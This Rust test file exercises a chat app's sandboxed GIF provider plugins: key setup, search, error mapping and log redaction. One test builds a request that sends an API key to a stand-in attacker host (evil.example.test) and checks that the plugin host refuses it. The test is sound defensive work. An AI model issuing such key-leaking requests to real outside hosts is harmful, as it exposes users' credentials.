//! The app's GIF provider plugins: bundled media providers through the real
//! wasm engine, with a scripted HTTP transport and an in-memory secret store.
//!
//! The guests are built into `target/plugins/` by `mise run plugins:build` (a
//! dependency of `mise run test`); without them these tests skip with a note.

use std::collections::VecDeque;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use components::gif_picker::GifError;
use futures::future::BoxFuture;
use parla::plugins::backend::{AppBackend, Transport};
use parla::plugins::builtin;
use parla::plugins::manager::{ManagerConfig, PluginManager, ProviderState};
use parla::plugins::secrets::{MemorySecrets, Secrets};
use plugin_host::backend::{ApiError, HostBackend as _, HttpRequest, HttpResponse};
use settings::{ConfigPaths, Settings, SettingsStore};
use tokio::runtime::Runtime;

// ---------------------------------------------------------------- harness

fn runtime() -> Runtime {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap()
}

fn fixture(plugin: &str, name: &str) -> Vec<u8> {
    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../../plugins")
        .join(plugin)
        .join("tests/fixtures")
        .join(name);
    std::fs::read(&path).unwrap_or_else(|e| panic!("{}: {e}", path.display()))
}

/// True when `id`'s wasm was embedded at build time.
fn bundled(id: &str) -> bool {
    builtin::get(id).is_some_and(|b| !b.wasm.is_empty())
}

/// Skips the test (passes) with a clear note when `id` is not bundled.
macro_rules! needs_wasm {
    ($id:literal) => {
        if !bundled($id) {
            eprintln!(
                "skipped: {} is not bundled; run `mise run plugins:build`",
                $id
            );
            return;
        }
    };
}

struct Scripted {
    requests: Mutex<Vec<HttpRequest>>,
    responses: Mutex<VecDeque<Result<HttpResponse, ApiError>>>,
}

impl Scripted {
    fn new() -> Arc<Self> {
        Arc::new(Self {
            requests: Mutex::new(Vec::new()),
            responses: Mutex::new(VecDeque::new()),
        })
    }

    fn script(&self, status: u16, body: Vec<u8>) {
        self.responses.lock().unwrap().push_back(Ok(HttpResponse {
            status,
            headers: Vec::new(),
            body,
        }));
    }

    fn fail(&self, error: ApiError) {
        self.responses.lock().unwrap().push_back(Err(error));
    }

    fn requests(&self) -> Vec<HttpRequest> {
        self.requests.lock().unwrap().clone()
    }
}

impl Transport for Scripted {
    fn fetch<'a>(
        &'a self,
        _plugin: &str,
        request: HttpRequest,
        _max_body: usize,
    ) -> BoxFuture<'a, Result<HttpResponse, ApiError>> {
        self.requests.lock().unwrap().push(request);
        let answer = self
            .responses
            .lock()
            .unwrap()
            .pop_front()
            .unwrap_or(Ok(HttpResponse {
                status: 200,
                headers: Vec::new(),
                body: Vec::new(),
            }));
        Box::pin(async move { answer })
    }
}

struct Harness {
    _dir: tempfile::TempDir,
    paths: ConfigPaths,
    manager: PluginManager,
    secrets: Arc<MemorySecrets>,
    transport: Arc<Scripted>,
}

impl Harness {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let paths = ConfigPaths::at(dir.path());
        std::fs::create_dir_all(&paths.root).unwrap();
        std::fs::write(&paths.settings, "{}\n").unwrap();
        let secrets = Arc::new(MemorySecrets::new());
        let transport = Scripted::new();
        let config = ManagerConfig::new(paths.root.join("cache"), paths.settings.clone())
            // The precompile child is the app binary, not this test binary.
            .with_compiler_program(PathBuf::from(env!("CARGO_BIN_EXE_parla")));
        let manager = PluginManager::with_parts(config, secrets.clone(), transport.clone());
        Self {
            _dir: dir,
            paths,
            manager,
            secrets,
            transport,
        }
    }

    fn settings(&self) -> Settings {
        SettingsStore::load(self.paths.clone()).current().clone()
    }

    fn gifs(&self) -> settings::GifSettings {
        self.settings().gifs
    }

    fn plugins(&self) -> settings::PluginsSettings {
        self.settings().plugins
    }
}

// ------------------------------------------------------------------ tests

#[test]
fn start_creates_no_engine() {
    let h = Harness::new();
    assert!(!h.manager.engine_created(), "no engine at creation");
    assert_eq!(h.manager.instance_count("giphy"), 0);
    assert!(h.transport.requests().is_empty());
}

#[test]
fn not_set_up_is_needs_setup_and_makes_no_request() {
    needs_wasm!("giphy");
    runtime().block_on(async {
        let h = Harness::new();
        let providers = h.manager.providers(&h.gifs(), &h.plugins()).await;
        assert_eq!(providers.len(), 2, "{providers:?}");
        for p in &providers {
            assert_eq!(p.state, ProviderState::NeedsSetup, "{}", p.id);
        }
        let err = h
            .manager
            .load("giphy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap_err();
        assert_eq!(err, GifError::NeedsSetup);
        assert!(h.transport.requests().is_empty(), "nothing left the app");
    });
}

#[test]
fn set_up_stores_key_and_enables() {
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("giphy", " key-123 ").await.unwrap();
        assert_eq!(
            h.secrets
                .get("giphy", "api_key")
                .await
                .unwrap()
                .map(|s| s.expose().to_owned()),
            Some("key-123".to_string())
        );
        let s = h.settings();
        assert!(
            s.plugins.entry("giphy").is_some_and(|e| e.enabled),
            "plugins.giphy.enabled is true in the file"
        );
        let providers = h.manager.providers(&h.gifs(), &h.plugins()).await;
        let giphy = providers.iter().find(|p| p.id == "giphy").unwrap();
        assert_eq!(giphy.state, ProviderState::Ready);
        assert!(h.transport.requests().is_empty());
    });
}

/// An enabled provider with no key is still `NeedsSetup`, and the guest never
/// makes a request: enabling is not the same as a key.
#[test]
fn enabled_without_a_key_is_needs_setup_and_makes_no_request() {
    needs_wasm!("giphy");
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("giphy", " ").await.unwrap();
        assert!(
            h.settings()
                .plugins
                .entry("giphy")
                .is_some_and(|e| e.enabled),
            "the switch is on"
        );
        h.manager.prime_keys().await;
        assert_eq!(h.manager.key_known("giphy"), Some(false));
        let err = h
            .manager
            .load("giphy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap_err();
        assert_eq!(err, GifError::NeedsSetup);
        assert!(h.transport.requests().is_empty(), "nothing left the app");
    });
}

#[test]
fn remove_key_asks_for_set_up_again() {
    needs_wasm!("giphy");
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("giphy", "key-123").await.unwrap();
        h.manager.remove_key("giphy").await.unwrap();
        assert!(h.secrets.get("giphy", "api_key").await.unwrap().is_none());
        assert_eq!(h.manager.key_known("giphy"), Some(false));
        let err = h
            .manager
            .load("giphy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap_err();
        assert_eq!(err, GifError::NeedsSetup);
        assert!(h.transport.requests().is_empty(), "nothing left the app");
    });
}

#[test]
fn search_returns_items_with_rating_and_key_in_request() {
    needs_wasm!("giphy");
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("giphy", "key-123").await.unwrap();
        h.transport.script(200, fixture("giphy", "search.json"));
        let mut gifs = h.gifs();
        gifs.rating = "g".into();
        let page = h
            .manager
            .load("giphy", Some("cats"), None, &gifs, &h.plugins())
            .await
            .unwrap();
        assert!(!page.items.is_empty(), "{page:?}");
        let first = &page.items[0];
        assert_eq!(first.id, "synthAlpha01");
        assert!(first.preview_url.starts_with("https://"));
        assert!(first.full_url.starts_with("https://"));
        assert_eq!((first.width, first.height), (480, 340));
        assert_eq!(first.attribution.as_deref(), Some("Powered by GIPHY"));
        let req = &h.transport.requests()[0];
        assert!(req.url.starts_with("https://api.giphy.com/"), "{}", req.url);
        assert!(req.url.contains("q=cats"), "{}", req.url);
        assert!(req.url.contains("rating=g"), "{}", req.url);
        assert!(req.url.contains("api_key=key-123"), "{}", req.url);
        assert_eq!(req.method.as_str(), "GET");
    });
}

#[test]
fn klipy_search_returns_items() {
    needs_wasm!("klipy");
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("klipy", "app-key").await.unwrap();
        h.transport.script(200, fixture("klipy", "search.json"));
        let page = h
            .manager
            .load("klipy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap();
        assert!(!page.items.is_empty(), "{page:?}");
        assert_eq!(page.items[0].id, "synthetic-klipy-alpha");
        let req = &h.transport.requests()[0];
        assert!(req.url.starts_with("https://api.klipy.com/api/v1/app-key/"));
        assert!(req.url.contains("content_filter="), "{}", req.url);
    });
}

#[test]
fn trending_returns_items_for_both_providers() {
    needs_wasm!("giphy");
    needs_wasm!("klipy");
    runtime().block_on(async {
        for (plugin, first, path, filter) in [
            ("giphy", "synthTrend01", "/v1/gifs/trending", "rating=pg-13"),
            (
                "klipy",
                "synthetic-klipy-delta",
                "/gifs/trending",
                "content_filter=",
            ),
        ] {
            let h = Harness::new();
            h.manager.set_up(plugin, "key-123").await.unwrap();
            h.transport
                .script(200, fixture(plugin, "trending-page-1.json"));
            let page = h
                .manager
                .load(plugin, None, None, &h.gifs(), &h.plugins())
                .await
                .unwrap();
            assert!(!page.items.is_empty(), "{plugin}: {page:?}");
            assert_eq!(page.items[0].id, first, "{plugin}");
            assert!(page.next.is_some(), "{plugin}: a next page");
            let req = &h.transport.requests()[0];
            assert!(req.url.starts_with("https://"), "{plugin}: {}", req.url);
            assert!(req.url.contains(path), "{plugin}: {}", req.url);
            assert!(req.url.contains(filter), "{plugin}: {}", req.url);
        }
    });
}

#[test]
fn rate_limited_maps_to_rate_limited() {
    needs_wasm!("giphy");
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("giphy", "key-123").await.unwrap();
        h.transport.script(429, Vec::new());
        let err = h
            .manager
            .load("giphy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap_err();
        assert_eq!(err, GifError::RateLimited);
    });
}

#[test]
fn offline_transport_maps_to_offline() {
    needs_wasm!("giphy");
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("giphy", "key-123").await.unwrap();
        h.transport.fail(ApiError::Offline);
        let err = h
            .manager
            .load("giphy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap_err();
        assert_eq!(err, GifError::Offline);
    });
}

#[test]
fn unauthorized_maps_to_needs_setup() {
    needs_wasm!("giphy");
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("giphy", "wrong").await.unwrap();
        h.transport.script(401, Vec::new());
        let err = h
            .manager
            .load("giphy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap_err();
        assert_eq!(err, GifError::NeedsSetup);
    });
}

#[test]
fn providers_follow_settings_order() {
    let h = Harness::new();
    let mut s = h.settings();
    s.gifs.providers = vec!["klipy".into(), "giphy".into(), "nope".into()];
    let ids: Vec<String> = runtime()
        .block_on(h.manager.providers(&s.gifs, &s.plugins))
        .into_iter()
        .map(|p| p.id)
        .collect();
    let mut want: Vec<String> = ["klipy", "giphy"]
        .into_iter()
        .filter(|id| bundled(id))
        .map(str::to_owned)
        .collect();
    assert_eq!(ids, want);
    want.reverse();
    s.gifs.providers.reverse();
    s.gifs.providers.retain(|id| id != "nope");
    let ids: Vec<String> = runtime()
        .block_on(h.manager.providers(&s.gifs, &s.plugins))
        .into_iter()
        .map(|p| p.id)
        .collect();
    assert_eq!(ids, want);
}

#[test]
fn request_to_other_host_is_refused() {
    let h = Harness::new();
    runtime().block_on(async {
        let manifest = builtin::get("giphy").unwrap().manifest().clone();
        let backend = AppBackend::new(
            manifest.clone(),
            h.transport.clone(),
            h.secrets.clone(),
            h.plugins(),
            plugin_host::backend::AppInfo {
                app_version: "0.0.0-test".into(),
                platform: "test".into(),
                locale: "en".into(),
                appearance: plugin_host::backend::Appearance::Dark,
                density: plugin_host::backend::Density::Cozy,
            },
        );
        let err = backend
            .http_fetch(
                &manifest.id,
                HttpRequest {
                    method: plugin_host::backend::HttpMethod::Get,
                    url: "https://evil.example.test/x?api_key=leak".into(),
                    headers: Vec::new(),
                    body: None,
                    timeout_ms: 1000,
                },
                4096,
            )
            .await
            .unwrap_err();
        assert!(matches!(err, ApiError::Denied(_)), "{err:?}");
        assert!(h.transport.requests().is_empty(), "the transport saw it");
    });
}

#[test]
fn closed_drops_instances() {
    needs_wasm!("giphy");
    runtime().block_on(async {
        let h = Harness::new();
        h.manager.set_up("giphy", "key-123").await.unwrap();
        h.transport.script(200, fixture("giphy", "search.json"));
        h.manager
            .load("giphy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap();
        assert_eq!(h.manager.instance_count("giphy"), 1);
        assert!(h.manager.engine_created());
        h.manager.closed();
        assert_eq!(h.manager.instance_count("giphy"), 0);
        assert!(h.manager.engine_created(), "the engine stays");
        // The next call makes a new instance.
        h.transport.script(200, fixture("giphy", "search.json"));
        h.manager
            .load("giphy", Some("cats"), None, &h.gifs(), &h.plugins())
            .await
            .unwrap();
        assert_eq!(h.manager.instance_count("giphy"), 1);
    });
}

/// Neither the error nor the log names the request URL, path or query: the
/// API key is in one and must never be written anywhere.
#[test]
fn errors_never_name_the_key_or_the_url() {
    needs_wasm!("giphy");
    needs_wasm!("klipy");
    runtime().block_on(async {
        let dir = tempfile::tempdir().unwrap();
        parla::log::init(dir.path());
        let h = Harness::new();
        for plugin in ["giphy", "klipy"] {
            h.manager.set_up(plugin, "secret-key-42").await.unwrap();
            h.transport.script(500, Vec::new());
            let err = h
                .manager
                .load(plugin, Some("cats"), None, &h.gifs(), &h.plugins())
                .await
                .unwrap_err();
            let text = match err {
                GifError::Failed(text) => text,
                other => panic!("{plugin}: {other:?}"),
            };
            for bad in ["secret-key-42", "/gifs", "api.klipy.com", "api.giphy.com"] {
                assert!(!text.contains(bad), "{plugin}: {text}");
            }
        }
        let log = parla::log::tail(dir.path(), 200).join("\n");
        assert!(!log.contains("secret-key-42"), "{log}");
        assert!(!log.contains("/gifs"), "{log}");
        assert!(!log.contains("q=cats"), "{log}");
    });
}
